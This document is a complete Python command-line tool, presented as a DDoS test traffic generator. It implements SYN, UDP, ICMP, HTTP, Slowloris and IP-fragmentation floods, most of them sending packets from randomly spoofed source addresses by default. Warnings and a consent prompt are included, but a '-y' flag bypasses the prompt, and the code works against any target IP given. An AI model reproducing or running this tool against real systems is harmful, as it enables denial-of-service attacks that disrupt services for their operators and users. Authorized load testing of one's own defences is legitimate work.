#!/usr/bin/env python3
"""
DDoS Test Traffic Generator

This tool generates test network traffic to evaluate DDoS protection mechanisms.
It can simulate various types of DDoS attacks for testing purposes only.

WARNING: This tool should ONLY be used in controlled environments with proper authorization.
Using this tool against systems without explicit permission is illegal and unethical.
"""

import argparse
import logging
import random
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import IP, TCP, UDP, ICMP, RandIP, RandShort, send, fragment, Raw
except ImportError:
    print("Scapy not installed. Please install with: pip install scapy")
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class TrafficGenerator:
    def __init__(self, target_ip, target_port=80, duration=10, rate=100, 
                 attack_type="syn", threads=4, source_ip=None):
        """
        Initialize the traffic generator
        
        Args:
            target_ip (str): Target IP address
            target_port (int): Target port number
            duration (int): Test duration in seconds
            rate (int): Packets per second per thread
            attack_type (str): Type of attack to simulate
            threads (int): Number of threads to use
            source_ip (str): Source IP address (if None, will use actual IP)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.rate = rate
        self.attack_type = attack_type
        self.threads = threads
        self.source_ip = source_ip
        self.running = False
        self.total_packets = 0
        
        # Validate attack type
        valid_types = ["syn", "udp", "icmp", "http", "slowloris", "fragmentation"]
        if attack_type not in valid_types:
            logger.error(f"Invalid attack type: {attack_type}")
            logger.error(f"Valid types are: {', '.join(valid_types)}")
            sys.exit(1)
            
        logger.info(f"Initializing {attack_type.upper()} traffic generator")
        logger.info(f"Target: {target_ip}:{target_port}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"Rate: {rate} packets/second/thread × {threads} threads = {rate * threads} packets/second")
        
    def generate_syn_flood(self):
        """Generate SYN flood packets"""
        start_time = time.time()
        packet_count = 0
        
        try:
            while self.running and time.time() - start_time < self.duration:
                # Create a SYN packet
                source_ip = self.source_ip or RandIP()
                packet = IP(dst=self.target_ip, src=source_ip) / \
                        TCP(sport=RandShort(), dport=self.target_port, flags="S")
                
                # Send the packet
                send(packet, verbose=0)
                packet_count += 1
                
                # Control the rate
                sleep_time = 1.0 / self.rate
                time.sleep(sleep_time)
                
        except Exception as e:
            logger.error(f"Error in SYN flood generation: {e}")
            
        return packet_count
    
    def generate_udp_flood(self):
        """Generate UDP flood packets"""
        start_time = time.time()
        packet_count = 0
        
        try:
            while self.running and time.time() - start_time < self.duration:
                # Create a UDP packet with random payload
                source_ip = self.source_ip or RandIP()
                payload = Raw(b"X" * random.randint(64, 1400))  # Random size payload
                packet = IP(dst=self.target_ip, src=source_ip) / \
                        UDP(sport=RandShort(), dport=self.target_port) / \
                        payload
                
                # Send the packet
                send(packet, verbose=0)
                packet_count += 1
                
                # Control the rate
                sleep_time = 1.0 / self.rate
                time.sleep(sleep_time)
                
        except Exception as e:
            logger.error(f"Error in UDP flood generation: {e}")
            
        return packet_count
    
    def generate_icmp_flood(self):
        """Generate ICMP flood packets"""
        start_time = time.time()
        packet_count = 0
        
        try:
            while self.running and time.time() - start_time < self.duration:
                # Create an ICMP (ping) packet
                source_ip = self.source_ip or RandIP()
                packet = IP(dst=self.target_ip, src=source_ip) / \
                        ICMP(type=8, code=0)  # Echo request
                
                # Send the packet
                send(packet, verbose=0)
                packet_count += 1
                
                # Control the rate
                sleep_time = 1.0 / self.rate
                time.sleep(sleep_time)
                
        except Exception as e:
            logger.error(f"Error in ICMP flood generation: {e}")
            
        return packet_count
    
    def generate_http_flood(self):
        """Generate HTTP flood requests"""
        start_time = time.time()
        packet_count = 0
        
        # HTTP request templates
        http_requests = [
            f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            f"GET /index.html HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            f"GET /search?q=test HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            f"POST /login HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: 27\r\n\r\nusername=test&password=test",
        ]
        
        try:
            while self.running and time.time() - start_time < self.duration:
                try:
                    # Create a TCP socket and connect to the target
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_ip, self.target_port))
                    
                    # Send a random HTTP request
                    request = random.choice(http_requests)
                    s.send(request.encode())
                    packet_count += 1
                    
                    # Close the socket
                    s.close()
                except Exception as e:
                    # Ignore connection errors and continue
                    pass
                
                # Control the rate
                sleep_time = 1.0 / self.rate
                time.sleep(sleep_time)
                
        except Exception as e:
            logger.error(f"Error in HTTP flood generation: {e}")
            
        return packet_count
    
    def generate_slowloris(self):
        """Generate Slowloris attack (slow HTTP headers)"""
        start_time = time.time()
        packet_count = 0
        active_sockets = []
        
        try:
            # Keep creating new connections throughout the duration
            while self.running and time.time() - start_time < self.duration:
                # Create new connections up to a limit
                while len(active_sockets) < self.rate:
                    try:
                        # Create a TCP socket and connect to the target
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((self.target_ip, self.target_port))
                        
                        # Send initial HTTP request line
                        s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                        active_sockets.append(s)
                        packet_count += 1
                    except Exception as e:
                        # Ignore connection errors and continue
                        break
                
                # Send a partial header to keep connections alive
                for s in list(active_sockets):
                    try:
                        # Send a partial header line
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        packet_count += 1
                    except:
                        # Remove failed sockets
                        active_sockets.remove(s)
                
                # Sleep for a bit before next round
                time.sleep(1)
                
            # Clean up all sockets
            for s in active_sockets:
                try:
                    s.close()
                except:
                    pass
                
        except Exception as e:
            logger.error(f"Error in Slowloris attack generation: {e}")
            
        return packet_count
    
    def generate_fragmentation(self):
        """Generate fragmented packet attacks"""
        start_time = time.time()
        packet_count = 0
        
        try:
            while self.running and time.time() - start_time < self.duration:
                # Create a TCP packet with a large payload
                source_ip = self.source_ip or RandIP()
                payload = Raw(b"X" * 1400)  # Large payload to fragment
                packet = IP(dst=self.target_ip, src=source_ip) / \
                        TCP(sport=RandShort(), dport=self.target_port, flags="S") / \
                        payload
                
                # Fragment the packet
                frags = fragment(packet, fragsize=200)
                
                # Send the fragments
                for frag in frags:
                    send(frag, verbose=0)
                    packet_count += 1
                
                # Control the rate
                sleep_time = 1.0 / self.rate
                time.sleep(sleep_time)
                
        except Exception as e:
            logger.error(f"Error in fragmentation attack generation: {e}")
            
        return packet_count
    
    def start(self):
        """Start the traffic generation"""
        self.running = True
        start_time = time.time()
        
        logger.info(f"Starting {self.attack_type.upper()} traffic generation to {self.target_ip}:{self.target_port}")
        
        # Create a thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Submit tasks based on attack type
            for _ in range(self.threads):
                if self.attack_type == "syn":
                    futures.append(executor.submit(self.generate_syn_flood))
                elif self.attack_type == "udp":
                    futures.append(executor.submit(self.generate_udp_flood))
                elif self.attack_type == "icmp":
                    futures.append(executor.submit(self.generate_icmp_flood))
                elif self.attack_type == "http":
                    futures.append(executor.submit(self.generate_http_flood))
                elif self.attack_type == "slowloris":
                    futures.append(executor.submit(self.generate_slowloris))
                elif self.attack_type == "fragmentation":
                    futures.append(executor.submit(self.generate_fragmentation))
            
            # Print status while running
            try:
                while self.running and time.time() - start_time < self.duration:
                    elapsed = time.time() - start_time
                    logger.info(f"Running... {elapsed:.1f}/{self.duration}s")
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("Stopping traffic generation...")
                self.running = False
            
            # Wait for threads to complete and collect results
            total_packets = 0
            for future in futures:
                total_packets += future.result()
        
        # Print summary
        elapsed = time.time() - start_time
        logger.info(f"Traffic generation completed")
        logger.info(f"Duration: {elapsed:.2f} seconds")
        logger.info(f"Total packets: {total_packets}")
        logger.info(f"Average rate: {total_packets / elapsed:.2f} packets/second")
        
        self.total_packets = total_packets

def check_target_permission():
    """
    Display warning and require explicit confirmation before proceeding
    """
    print("\n" + "!" * 80)
    print("WARNING: THIS TOOL IS FOR TESTING YOUR OWN SYSTEMS ONLY!".center(80))
    print("Using this tool against any system without explicit permission is ILLEGAL.".center(80))
    print("!" * 80 + "\n")
    
    answer = input("Do you have permission to test the target system? (yes/no): ")
    if answer.lower() not in ["yes", "y"]:
        print("Aborting.")
        sys.exit(1)
    
    print("By continuing, you acknowledge that:")
    print("1. You are responsible for any damage or service disruption caused by this tool")
    print("2. You have explicit permission to test the target system")
    print("3. You are using this tool in a controlled environment")
    
    answer = input("Do you understand and accept these terms? (yes/no): ")
    if answer.lower() not in ["yes", "y"]:
        print("Aborting.")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="DDoS Test Traffic Generator (For authorized testing only)",
        epilog="WARNING: Use only on systems you have permission to test!"
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port number (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Test duration in seconds (default: 10)")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second per thread (default: 100)")
    parser.add_argument("-a", "--attack", default="syn", 
                        choices=["syn", "udp", "icmp", "http", "slowloris", "fragmentation"],
                        help="Attack type to simulate (default: syn)")
    parser.add_argument("-n", "--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("-s", "--source", help="Source IP address (default: random)")
    parser.add_argument("-y", "--yes", action="store_true", help="Skip safety confirmation prompts")
    
    args = parser.parse_args()
    
    # Check for permission unless skipped
    if not args.yes:
        check_target_permission()
    
    # Create and start the traffic generator
    generator = TrafficGenerator(
        target_ip=args.target,
        target_port=args.port,
        duration=args.duration,
        rate=args.rate,
        attack_type=args.attack,
        threads=args.threads,
        source_ip=args.source
    )
    
    generator.start()

if __name__ == "__main__":
    main() 